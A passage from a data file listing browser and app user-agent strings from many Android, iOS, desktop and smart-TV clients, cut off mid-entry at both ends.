[FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/176.0.394746740 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Linux; Android 13; SM-G986B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5) Plus Build/OPS28.85-17-6-2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 277.1.0.20.110 (iPhone14,5; iOS 16_5; tr_TR; tr-TR; scale=3.00; 1170x2532; 462633398)","Mozilla/5.0 (Linux; Android 11; M2101K6G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; IV2201 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.149 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; NE2213 Build/SKQ1.220617.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 Instagram 276.1.0.26.103 Android (33/13; 640dpi; 1440x3024; OnePlus; NE2213; OP516FL1; qcom; it_IT; 460846234)","TuneIn Radio/25.2.1; iPhone14,5; iOS/16.4.1","Mozilla/5.0 (Linux; Android 10; SM-G960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 GNews Android/2022120648","AppleCoreMedia/1.0.0.20L497 (Apple TV; U; CPU OS 16_4 like Mac OS X; tr_tr)","Mozilla/5.0 (Linux; Android 11; Power Armor 13) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-G970N Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","AppleCoreMedia/1.0.0.20E252 (iPhone; U; CPU OS 16_4_1 like Mac OS X; es_es)","Mozilla/5.0 (Linux; Android 12; 220333QNY Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-A025M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; CPH2161 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; CMA-LX1 Build/HONORCMA-L41CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; LM-Q630) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","TuneIn Radio Pro/25.2.1; iPad12,1; iPadOS/16.3.1","TuneIn Radio Pro/25.0.0; iPhone14,7; iOS/16.1.2","TuneIn Radio/25.2.1; iPhone13,2; iOS/16.4.1","Mozilla/5.0 (Linux; Android 13; SM-G736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; M2007J20CG Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.1.115;]","Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36 OPR/40.0.2207.0 OMI/4.9.0.237.Martell-2.325 Model/Hisense-MT5658-SDK4-9 MT5658 (;Hisense;SmartTV;V0000.01.00a.M0207;HE55A6500UWTS) FXM-U2FsdGVkX1/uczsoLJQtZsJtSqBorB0MRQaxDOPchEtf/Q3VPWOCWvvZ/uacchKW-END","Mozilla/5.0 (Linux; Android 9; SM-A105FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","AppleCoreMedia/1.0.0.20F5028e (iPhone; U; CPU OS 16_5 like Mac OS X; tr_tr)","Mozilla/5.0 (Linux; Android 12; M2007J17G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A202F/A202FXXS3BTK1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; S62 Pro Build/RKQ1.210406.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; VTR-L09 Build/HUAWEIVTR-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; T810H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","AppleCoreMedia/1.0.0.20E252 (iPad; U; CPU OS 16_4_1 like Mac OS X; da_dk)","Mozilla/5.0 (Linux; Android 8.1.0; View2 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; RMX3363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; KB2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","PolaroidMusic/1245 CFNetwork/1399 Darwin/22.1.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0 TO-Browser/TOB7.111.0.205_01","Mozilla/5.0 (Linux; Android 11; SM-A405FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 11; moto g 5G plus Build/RPNS31.Q4U-39-27-9-2-9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 10; M2010J19SY Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.35.106;]","Mozilla/5.0 (Linux; Android 11; ANY-NX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; TECNO KE5k Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A315G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; S62 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5]","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B/G991BXXU4BULF) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; EML-L09 Build/HUAWEIEML-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.115 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 11; 22011119UY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; M2007J17G Build/QKQ1.200628.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]","TuneIn Radio/25.2.0; iPad11,7; iPadOS/16.2","Mozilla/5.0 (Linux; Android 12; SM-F721B Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; Mi Note 10 Lite Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; LLD-L31 Build/HONORLLD-L31) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 9; Redmi Note 6 Pro Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; SM-S908B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Dalvik/2.1.0 (Linux; U; Android 12; XQ-AS42 Build/58.2.A.10.163)","Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 277.1.0.20.110 (iPhone12,1; iOS 16_2; tr_TR; tr-TR; scale=2.00; 828x1792; 462633398) NW/1","Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 277.1.0.20.110 (iPhone12,1; iOS 16_2; tr_TR; tr-TR; scale=2.00; 828x1792; 462633398)","Mozilla/5.0 (Linux; Android 11; moto e40) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","TuneIn Radio/25.2.1; iPhone13,1; iOS/16.0","radio.net 5.6.20 (iPad; iPhone OS 16.4; nl_NL)","Mozilla/5.0 (Linux; Android 8.1.0; DRA-L21 Build/HUAWEIDRA-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]","Mozilla/5.0 (Linux; Android 9; ASUS_Z01QD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; KB2005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Unique/92.7.3956.57","Mozilla/5.0 (Linux; Android 11; Nokia C20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0; 9003X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 10; moto g(8) power lite Build/QODS30.163-7-32; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio/25.2.1; iPhone10,4; iOS/16.2","Mozilla/5.0 (Linux; Android 13; CPH2363 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; RMX2086) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-X205 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 10; VOG-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","TuneIn Radio/25.2.1; iPhone10,5; iOS/16.2","AppleCoreMedia/1.0.0.20E252 (iPhone; U; CPU OS 16_4_1 like Mac OS X; ro_ro)","Mozilla/5.0 (Linux; Android 10; M2010J19SY Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 11; SM-A022M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","TuneIn Radio/25.2.1; iPhone11,6; iOS/16.4.1","Mozilla/5.0 (Linux; Android 9; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio/25.2.1; iPhone11,8; iOS/16.2","Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (5142325760)","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Unique/96.7.2526.27","Dalvik/2.1.0 (Linux; U; Android 11; Chromebox Reference Build/R110-15278.72.0)","Mozilla/5.0 (Linux; Android 11; RMX3263 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 13; CPH2461 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-M526BR Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/402.0.0.11.101;]","Mozilla/5.0 (Linux; Android 11; RMX3231 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; SM-A205G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; CPH2135) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; Nokia 3.4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; HarmonyOS; AGS5-W09; HMSCore 6.7.0.339) AppleWebKit/600.36 (KHTML, like Gecko) Chrome/105.0.4515.105 HuaweiBrowser/12.1.3.304 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-G990E Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.1.0; SM-J530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (iPad; CPU OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/407.1.0.42.94;FBBV/458594382;FBDV/iPad13,17;FBMD/iPad;FBSN/iPadOS;FBSV/16.3.1;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5;FBRV/0]","Mozilla/5.0 (Linux; Android 11; M2006C3MG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; ONEPLUS A5010 Build/QKQ1.191014.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; M2101K7BNY Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; STS502 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-S901E Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","TuneIn Radio/25.2.1; iPhone12,5; iOS/16.0","Mozilla/5.0 (Linux; Android 11; SM-A505FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 9; SM-N950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; moto g42 Build/S2SES32.28-70-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.43 Viewer/92.9.2058.59","Mozilla/5.0 (iPad; CPU OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/258.1.520699392 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Linux; Android 12; M2007J17G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 Instagram 277.0.0.17.107 Android (29/10; 440dpi; 1080x2131; Xiaomi/xiaomi; Redmi Note 7; lavender; qcom; it_IT; 462178165)","Mozilla/5.0 (Linux; Android 10; W-V680-OPE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3LVG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-G990B2 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 12; NTH-AN00; HMSCore 6.10.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/13.0.4.321 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; 2109119DG Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","TuneIn Radio Pro/25.2.1; iPhone14,5; iOS/16.4.1","Mozilla/5.0 (Linux; Android 12; SM-M317F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 7.1.1; ASUS_Z01KDA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBIOS;FBAV/407.1.0.42.94;FBBV/458594382;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/15.6.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/463586505]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E252 [FBAN/FBIOS;FBDV/iPhone15,2;FBMD/iPhone;FBSN/iOS;FBSV/16.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]","Mozilla/5.0 (Linux; Android 13; SM-S901B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/402.0.0.11.101;]","Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; CPH2069 Build/RKQ1.200903.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 9; SM-N950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E252 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5]","Mozilla/5.0 (Linux; Android 8.0.0; SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","TuneIn Radio/25.2.1; iPhone15,2; iOS/16.3","Mozilla/5.0 (Linux; Android 12; CPH2197 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; JAT-L29 Build/HONORJAT-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio/25.2.1; iPhone14,2; iOS/16.0.3","Mozilla/5.0 (Linux; Android 5.1; HUAWEI TIT-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 EdgA/95.0.1020.55","Mozilla/5.0 (Linux; Android 12; SM-N975U1 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F5028e [FBAN/FBIOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/16.5;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]","Mozilla/5.0 (Linux; Android 11; T781 Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Mi A2 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","Mozilla/5.0 (Linux; Android 10; M2010J19CG Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; JNY-LX1; HMSCore 6.1.0.313) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Mi Note 10 Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; V2041) AppleWebKit/537.36 (KHTML, like Gecko) 